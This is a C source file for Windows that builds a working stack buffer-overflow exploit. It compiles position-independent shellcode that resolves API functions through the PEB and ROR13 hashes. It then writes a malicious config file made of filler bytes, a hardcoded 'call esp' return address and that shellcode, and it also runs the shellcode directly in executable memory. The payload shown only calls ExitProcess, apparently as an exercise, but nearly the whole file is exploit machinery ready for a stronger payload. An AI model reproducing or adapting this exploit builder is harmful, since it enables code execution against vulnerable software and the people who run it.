#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <wchar.h>

#pragma region ShellCode

PPEB get_peb(void);
DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string);
DWORD __stdcall ror13_hash(const char *string);
HMODULE __stdcall find_module_by_hash(DWORD hash);
HMODULE __stdcall find_kernel32(void);
FARPROC __stdcall find_function(HMODULE module, DWORD hash);

void __stdcall shell_code()
{
	HMODULE kern32;
	char name[] = { 'E','x','i','t','P','r','o','c','e','s','s', 1 - 1 };

	__asm
	{
		mov eax, ebx
		mov eax, ebx
		mov eax, ebx
		mov eax, ebx
		mov eax, ebx
	}

	kern32 = find_kernel32();
	FARPROC exit = find_function(kern32, ror13_hash((char*)name));

	exit(0);
	//hProcess = find_process(kern32, (char *)procname);
}

HMODULE __stdcall find_kernel32(void)
{
	return find_module_by_hash(ror13_hash("KERNEL32.DLL"));
}

HMODULE __stdcall find_module_by_hash(DWORD hash)
{
	PPEB peb = NULL;
	LDR_DATA_TABLE_ENTRY *module_ptr = NULL, *first_mod = NULL;
	PLIST_ENTRY pListEntry = NULL;

	peb = get_peb();

	pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
	module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
	first_mod = module_ptr;

	do 
	{
		if (module_ptr->FullDllName.Length != 0 &&
			unicode_ror13_hash((WCHAR *)module_ptr->FullDllName.Buffer) == hash)
		{
			return (HMODULE)module_ptr->Reserved2[0];
		}

		else
		{
			pListEntry = pListEntry->Flink;
			module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
		}

	} while (module_ptr && module_ptr != first_mod);   // because the list wraps,

	return INVALID_HANDLE_VALUE;
}

PPEB __declspec(naked) get_peb(void)
{
	__asm {
		mov eax, fs:[0x30]
		ret
	}
}

DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string)
{
	DWORD hash = 0;

	while (*unicode_string != 0)
	{
		DWORD val = (DWORD)*unicode_string++;
		hash = (hash >> 13) | (hash << 19); // ROR 13
		hash += val;
	}
	return hash;
}

DWORD __stdcall ror13_hash(const char *string)
{
	DWORD hash = 0;

	while (*string) {
		DWORD val = (DWORD)*string++;
		hash = (hash >> 13) | (hash << 19);  // ROR 13
		hash += val;
	}
	return hash;
}

FARPROC __stdcall find_function(HMODULE module, DWORD hash)
{
	IMAGE_DOS_HEADER *dos_header;
	IMAGE_NT_HEADERS *nt_headers;
	IMAGE_EXPORT_DIRECTORY *export_dir;
	DWORD *names, *funcs;
	WORD *nameords;
	unsigned i;

	dos_header = (IMAGE_DOS_HEADER *)module;
	nt_headers = (IMAGE_NT_HEADERS *)((char *)module + dos_header->e_lfanew);
	export_dir = (IMAGE_EXPORT_DIRECTORY *)((char *)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	names = (DWORD *)((char *)module + export_dir->AddressOfNames);
	funcs = (DWORD *)((char *)module + export_dir->AddressOfFunctions);
	nameords = (WORD *)((char *)module + export_dir->AddressOfNameOrdinals);

	for (i = 0; i < export_dir->NumberOfNames; i++)
	{
		char *string = (char *)module + names[i];
		if (hash == ror13_hash(string))
		{
			WORD nameord = nameords[i];
			DWORD funcrva = funcs[nameord];
			return (FARPROC)((char *)module + funcrva);
		}
	}

	return NULL;
}

void __declspec(naked) END_SHELLCODE(void) {}

#pragma endregion ShellCode


//////////////

#define SHELLCODE_FILE		"shellcode.bin"
#define CONFIG_FILE			"config_23"
#define CONFIG_FILE_COPY	"config_23_copy"

// gets file size in bytes
unsigned getFileSize(char* path)
{
	FILE* f = fopen(path, "rb");
	fseek(f, 0, SEEK_END);
	long n = ftell(f);
	fclose(f);

	if (n > 0)
		return (unsigned)n;

	return 0;
}

// load shellcode as payload into conf file
BOOL load_shellcode(char *path, char* path_to, char* callEspAddr)
{
	HANDLE hfile;
	unsigned int size, readed, written;

	// load shellcode from bin file to buffer
	hfile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		printf("Error, can't open shellcode!\n");
		return FALSE;
	}

	size = GetFileSize(hfile, NULL);
	if (!size) {
		printf("Error, file is empty\n");
		return FALSE;
	}

	char *pbuf = (char *)malloc(size);
	if (!ReadFile(hfile, pbuf, size, (LPDWORD)&readed, NULL)) {
		printf("Error, can't read shellcode data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	CloseHandle(hfile);
	hfile = NULL;

	// write shellcode to file as a payload
	hfile = CreateFileA(path_to, FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		printf("Error, can't open config file!\n");
		return FALSE;
	}

	// write 3000 + 4 + 4 + 4 'H' bytes (append after /start)
	char tmp[3000 + sizeof(int) + sizeof(int) + sizeof(int)];
	memset(tmp, 'H', sizeof(tmp));
	if (!WriteFile(hfile, tmp, sizeof(tmp), (LPDWORD)&written, NULL)) {
		printf("Error, can't write trash data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	// overwrite return address by call esp address
	if (!WriteFile(hfile, callEspAddr, sizeof(unsigned), (LPDWORD)&written, NULL)) {
		printf("Error, can't write callespaddr data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	// overwrite return address by call esp address
	if (!WriteFile(hfile, pbuf, size, (LPDWORD)&written, NULL)) {
		printf("Error, can't write shellcode data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	free(pbuf);
	CloseHandle(hfile);
	return TRUE;
}

void LoadAndExecShellCode(char* path)
{
	unsigned fsize = getFileSize(path);
	char* code = malloc(fsize);
	
	FILE* f = fopen(path, "rb");
	fread(code, sizeof(char), fsize, f);
	fclose(f);

	LPVOID pspace = NULL;

	pspace = VirtualAlloc(NULL, fsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pspace) {
		printf("Error, can't allocate virtual page\n");
		free(code); 
		return;
	}

	memcpy(pspace, code, fsize);
	((void(*)())pspace)();//call shellcode

	VirtualFree(pspace, 0, MEM_RELEASE);
	free(code); 
}

int main(int argc, char *argv[])
{
	// write shellcode
	FILE *output_file = fopen(SHELLCODE_FILE, "wb");
	fwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);
	fclose(output_file);

	// get call esp addr reversed
	char callEspAddrRev[] = "\x62\x50\x12\x97";
	_strrev(callEspAddrRev);

	// and clear config file
	CopyFile(CONFIG_FILE_COPY, CONFIG_FILE, FALSE);

	if (!load_shellcode(SHELLCODE_FILE, CONFIG_FILE, callEspAddrRev)) {

		printf("Unable to load shell. Exitting");
		return 1;
	}

	LoadAndExecShellCode(SHELLCODE_FILE);

	// for compilation and debugging
	shell_code();
	return 0;
}
